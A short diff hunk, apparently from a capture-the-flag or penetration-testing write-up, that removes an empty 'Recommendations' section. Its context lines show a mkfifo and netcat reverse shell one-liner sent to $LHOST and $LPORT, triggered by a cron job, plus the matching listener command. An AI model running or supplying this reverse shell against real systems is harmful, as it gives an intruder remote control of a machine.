@@ -40,7 +40,3 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
 ```
 
 All you have to do now is waiting the cron job to run and start a listener on your environement with `nc -lnvp $LPORT`.
-
-## Recommendations
-
-TODO
